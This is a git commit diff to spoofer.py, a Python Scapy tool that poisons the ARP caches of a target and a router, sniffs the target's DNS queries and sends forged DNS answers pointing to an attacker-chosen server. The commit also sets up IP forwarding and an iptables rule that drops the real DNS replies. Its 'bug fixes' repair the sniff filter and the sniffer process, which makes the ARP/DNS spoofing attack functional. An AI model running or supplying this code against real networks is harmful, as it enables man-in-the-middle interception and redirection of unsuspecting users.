03caa45c1b6615e93c10da78ae838fb6d6a2c4c7
root <root@localhost.localdomain>
2019-08-21 21:40:55 +0530

    fix bugs

--- spoofer.py
+++ spoofer.py
@@ -9,17 +9,23 @@ import platform
 import time
 from multiprocessing import Process
 
-DNS_FILTER = "udp port 53"
-SPOOFED_SITE = [b'www.resonous.com.']	#192.168.1.5
-
 g_target_ip = ""
 g_router_ip = ""
 g_server_ip = ""
 
+
+"""
+	This function is responsible for sniffing for DNS packets and
+	forwarding them to the spoofer. 
+"""
 def dns_sniffer():
 	global g_target_ip
-	sniff(filter="udp port 53 and host" + g_target_ip, prn=dns_spoofer)
+	sniff(filter="udp and port 53 and host " + g_target_ip, prn=dns_spoofer)
 
+"""
+	This function is responsible for sending spoofed DNS responses to
+	the target with the answer as the server address provided by us.
+"""
 def dns_spoofer(pkt):
 	global g_target_ip, g_router_ip, g_server_ip
 
@@ -63,16 +69,20 @@ def dns_spoofer(pkt):
 		send(dns_resp, verbose=0)
 		print(f"Resolved DNS request for {pkt[DNS].qd.qname} by {g_server_ip}")
 
-
+"""
+	This function is responsible for getting the MAC address
+	of the IP address passed in as the arg.
+"""
 def get_mac(ip):
 	arp = Ether()/ARP(pdst=ip)
-	resp = srp1(arp)
+	resp = srp1(arp, verbose=0)
 	return (resp[Ether].src)
 
 """
-	Enables IP forwarding and disables DNS forwarding
+	Enables IP forwarding and disables DNS forwarding.
 """
-def forwarding():
+def setup_config():
+	print("Enabling IP forwarding")
 	# Check to see if script is running on linux
 	if (platform.system() == "Linux"):
 		# Enable IP forwarding
@@ -86,18 +96,22 @@ def forwarding():
 		firewall = "iptables -A FORWARD -p UDP --dport 53 -j DROP"
 		Popen([firewall], shell=True, stdout=PIPE)
 
-	# first complete linux
+	# To-do
 	if (platform.system() == "Windows"):
 		sys.exit("Please enable IP forwarding")
 
+"""
+	This function is responsible for poisoning the target's
+	and the router's ARP cache.
+"""
 def poison_arp_cache(target_mac, router_mac):
 	global g_target_ip, g_router_ip
 	while True:
 		# Poison router's cache (Scapy will automatically fill in the ethernet frame with our MAC)
-		send(ARP(op=2, psrc=g_target_ip, pdst=g_router_ip, hwdst=router_mac))
+		send(ARP(op=2, psrc=g_target_ip, pdst=g_router_ip, hwdst=router_mac), verbose=0)
 
 		# Poison target's cache
-		send(ARP(op=2, psrc=g_router_ip, pdst=g_target_ip, hwdst=target_mac))
+		send(ARP(op=2, psrc=g_router_ip, pdst=g_target_ip, hwdst=target_mac), verbose=0)
 
 		# Sleep to prevent flooding
 		time.sleep(2)
@@ -117,6 +131,10 @@ def main():
 	g_router_ip = args.r
 	g_server_ip = args.s
 
+	print("Target IP: ", g_target_ip)
+	print("Router IP: ", g_router_ip)
+	print("Server IP: ", g_server_ip)
+
 	# Get the mac address
 	target_mac = get_mac(g_target_ip)
 	router_mac = get_mac(g_router_ip)
@@ -124,26 +142,26 @@ def main():
 
 	# Check to see if we got the MAC address
 	if (router_mac == None):
-		sys.exit("Couldnt get router's MAC address. exiting")
+		sys.exit("[#] Couldnt get router's MAC address. exiting")
 	if (target_mac == None):
-		sys.exit("Couldnt get target's MAC address. exiting")
+		sys.exit("[#] Couldnt get target's MAC address. exiting")
 	if (our_mac == None):
-		sys.exit("Couldnt get our MAC address. exiting")
+		sys.exit("[#] Couldnt get our MAC address. exiting")
 
 	print("[*] Router MAC: ", router_mac)
 	print("[*] Target MAC: ", target_mac)
 
-	forwarding()
+	setup_config()
 
 	# Create ARP poisoner
 	process_arp_poisoner = Process(target=poison_arp_cache,args=(target_mac, router_mac))
 	process_arp_poisoner.start()
 
 	# Create DNS sniffer
-	process_dns_sniffer = Process(target=dns_spoofer)
+	process_dns_sniffer = Process(target=dns_sniffer)
 	process_dns_sniffer.start()
 
-	# Wait either for process to complete or user to exit
+	# Wait either for the processes to complete or user to exit
 	process_arp_poisoner.join()
 	process_dns_sniffer.join()
 
